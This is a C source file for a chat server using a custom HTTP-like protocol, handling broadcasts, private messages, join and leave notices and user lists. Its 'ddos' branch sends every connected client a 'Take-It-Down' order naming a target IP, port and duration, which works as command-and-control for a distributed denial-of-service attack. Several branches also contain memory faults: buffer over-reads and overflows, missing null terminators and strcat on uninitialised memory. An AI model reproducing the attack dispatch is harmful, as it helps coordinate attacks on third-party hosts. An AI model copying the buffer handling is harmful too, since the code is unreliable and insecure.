#include "../lib/server.h"

p_custom_http httpProcess(int Socket){
	char *header = malloc(LARGEST_HEADER_SIZE);
	if(!header)
		return NULL;

	ssize_t rv = recvAllFixed(Socket, header, LARGEST_HEADER_SIZE, MSG_PEEK);
	if( rv == -1)
		goto clean_one;

	struct chttp c;
	c.buffer = header;
	c.size  = rv;

	char *eol = strstr(header, "\r\n\r\n");
	if(!eol)
		goto clean_one;

	char *cl = chttp_lookup(&c, "Content-Length: ");
	if(!cl)
		goto clean_one;

	size_t size = atol(cl);
	free(cl);

	size_t headerSize = eol + 4  - header;

	char *buffer = malloc((size + headerSize) * sizeof(char));
	if(!buffer)
		goto clean_two;

	p_custom_http p = malloc(sizeof(struct chttp));
	if(!p)
		goto clean_two;
	p->buffer = buffer;
	p->size = size + headerSize;

	rv = recvAllFixed(Socket, buffer, size + headerSize, 0);
	if( rv == -1)
		goto clean_two;
	else
		return p;


	clean_two:
		free(buffer);
	clean_one:
		free(header);
		return NULL;

}

char *getUsername(int Sock, const p_threadVector handles,const p_threadVector usernames){
	size_t handlesSize = threadVector_getSize(handles);

	for(size_t i = 0 ; i < handlesSize ; i++){
			int sock = *(int *)threadVector_at(handles, i);
			if(sock == Sock)
				return threadVector_at(usernames, i);
	}
	return NULL;
}


void react( int Socket, const p_threadInfo ti, char *action, char* data, const p_custom_http x){
	struct userData *u = ti->reserved;
	if(strcmp(action, "Broadcast") == 0){
		p_custom_http p = chttp_init();
		chttp_add_header(p, "Client-Action: Display", 22);

		char *username = getUsername(Socket, u->handles, u->usernames);
		if(!username){
			chttp_destroy(p);
			return;
		}
		size_t dataSize = strlen(data);
		size_t usernameSize = strlen(username);
		char *msg = malloc(dataSize + usernameSize + 10);
		if(!msg){
			chttp_destroy(p);
			return;
		}
		memcpy(msg, username, usernameSize);
		memcpy(msg+usernameSize,"-> ",3);
		memcpy(msg+usernameSize+3,data,dataSize);
		msg[usernameSize+3+dataSize] = '\0';
		chttp_finalise(p, msg, usernameSize+3+dataSize);
		//
		// for(size_t i = 0 ; i < p->size ; i++)
		// 	printf("%c", p->buffer[i]);

		size_t size = threadVector_getSize(u->handles);
		for(size_t i = 0 ; i < size ; i++){
			int *sock = threadVector_at(u->handles, i);
			if(!sock)
				continue; // Ignore
			else if (*sock != Socket){
				sendAllFixed(*sock, p->buffer, p->size, 0);
			}
		}

		chttp_destroy(p);
		return;
	}else if(strcmp(action, "Notify-Client-Connect") == 0){
		// Notify
		p_custom_http p = chttp_init();
		chttp_add_header(p, "Client-Action: Display", 22);

		char *username = "Server-Bot";
		char *username2 = getUsername(Socket, u->handles, u->usernames);
		if(!username2){
			chttp_destroy(p);
			return;
		}

		size_t usernameSize = strlen(username);
		size_t username2Size = strlen(username2);
		char *msg = malloc(username2Size+usernameSize+3+13);
		if(!msg){
			chttp_destroy(p);
			return;
		}

		memcpy(msg, username, usernameSize);
		memcpy(msg+usernameSize,"-> ",3);
		memcpy(msg+usernameSize+3, username2 ,username2Size);
		memcpy(msg+usernameSize+username2Size+3," has joined!\n", 13);
		msg[username2Size+usernameSize+3+13] = '\0';

		chttp_finalise(p, msg, username2Size+usernameSize+3+13);


		size_t size = threadVector_getSize(u->handles);
		for(size_t i = 0 ; i < size ; i++){
			int *sock = threadVector_at(u->handles, i);
			if(!sock)
				continue; // Ignore
			else if (*sock != Socket){
				sendAllFixed(*sock, p->buffer, p->size, 0);
			}
		}
		chttp_destroy(p);
	}
	else if(strcmp(action, "Notify-Client-Disconnect") == 0){
		p_custom_http p = chttp_init();
		chttp_add_header(p, "Client-Action: Display", 22);

		char *username = "Server-Bot";
		char *username2 = getUsername(Socket, u->handles, u->usernames);
		if(!username2){
			chttp_destroy(p);
			return;
		}

		size_t usernameSize = strlen(username);
		size_t username2Size = strlen(username2);
		char *msg = malloc(username2Size+usernameSize+3+13);
		if(!msg){
			chttp_destroy(p);
			return;
		}

		memcpy(msg, username, usernameSize);
		memcpy(msg+usernameSize,"-> ",3);
		memcpy(msg+usernameSize+3, username2 ,username2Size);
		memcpy(msg+usernameSize+username2Size+3," has left!\n", 13);
		msg[username2Size+usernameSize+3+13] = '\0';

		chttp_finalise(p, msg, username2Size+usernameSize+3+13);


		size_t size = threadVector_getSize(u->handles);
		for(size_t i = 0 ; i < size ; i++){
			int *sock = threadVector_at(u->handles, i);
			if(!sock)
				continue; // Ignore
			else if (*sock != Socket){
				sendAllFixed(*sock, p->buffer, p->size, 0);
			}
		}
		chttp_destroy(p);
	}else if(strcmp(action, "Message") == 0){
		char *user = chttp_lookup(x, "Target-Client: ");

		size_t dataSize = strlen(data);
		size_t usersSize = threadVector_getSize(u->usernames);
		for(size_t i = 0 ; i < usersSize ; i++)
			if( strcmp(user,threadVector_at(u->usernames, i)) == 0 ){
				p_custom_http h = chttp_init();
				chttp_add_header(h, "Client-Action: Display", 22);

				char *username = getUsername(Socket, u->handles, u->usernames);
				if(!username){
					chttp_destroy(h);
					return;
				}

				size_t usernameSize = strlen(username);

				char *msg = malloc(usernameSize+3+dataSize);
				if(!msg){
					chttp_destroy(h);
					return;
				}

				memcpy(msg, username, usernameSize);
				memcpy(msg+usernameSize,"-> ",3);
				memcpy(msg+usernameSize+3, data ,dataSize);

				msg[usernameSize+3+dataSize] = '\0';

				chttp_finalise(h, msg, usernameSize+3+dataSize);
				sendAllFixed(*(int *)threadVector_at(u->handles, i), h->buffer, h->size, 0);
				chttp_destroy(h);
				// chttp_destroy(p);
				break;
			}
			free(user);
	}else if(strcmp(action, "ddos") == 0){

		p_custom_http p = chttp_init();
		chttp_add_header(p, "Client-Action: Take-It-Down", 27);
		char buffer[250];
		size_t n = snprintf(buffer,250,"ip: %s", data);
		chttp_add_header(p, buffer, n);
		chttp_add_header(p, "port: 8080", 10);
		chttp_add_header(p, "seconds: 10", 11);




		chttp_finalise(p, "bleh",4);
		//
		// for(size_t i = 0 ; i < p->size ; i++)
		// 	printf("%c", p->buffer[i]);

		size_t size = threadVector_getSize(u->handles);
		for(size_t i = 0 ; i < size ; i++){
			int *sock = threadVector_at(u->handles, i);
			sendAllFixed(*sock, p->buffer, p->size, 0);
		}

		chttp_destroy(p);
		return;
	}else if(strcmp(action, "List") == 0){
		// Notify
		p_custom_http p = chttp_init();
		chttp_add_header(p, "Client-Action: Display", 22);

		char *username = "Server-Bot-> ";
		size_t namesSize = 0;
		size_t arrList = threadVector_getSize(u->usernames);

		for(size_t i = 0 ; i < arrList ; i++)
			namesSize+=strlen(threadVector_at(u->usernames, i));

		char *msg = malloc(strlen(username) + namesSize + arrList);
		if(!msg){
			chttp_destroy(p);
			return;
		}
		strcat(msg, username);
		for (size_t i = 0; i < arrList; i++) {
			strcat(msg, threadVector_at(u->usernames, i));
			strcat(msg, ",");
		}

		msg[strlen(username) + namesSize + arrList - 1] = '\n';
		msg[strlen(username) + namesSize + arrList ] = 0;

		chttp_finalise(p, msg, strlen(msg));



		size_t size = threadVector_getSize(u->handles);
		for(size_t i = 0 ; i < size ; i++){
			int *sock = threadVector_at(u->handles, i);
			if(!sock)
				continue; // Ignore
			else if (*sock == Socket){
				sendAllFixed(*sock, p->buffer, p->size, 0);
			}
		}
		chttp_destroy(p);
		free(msg);
	}
}
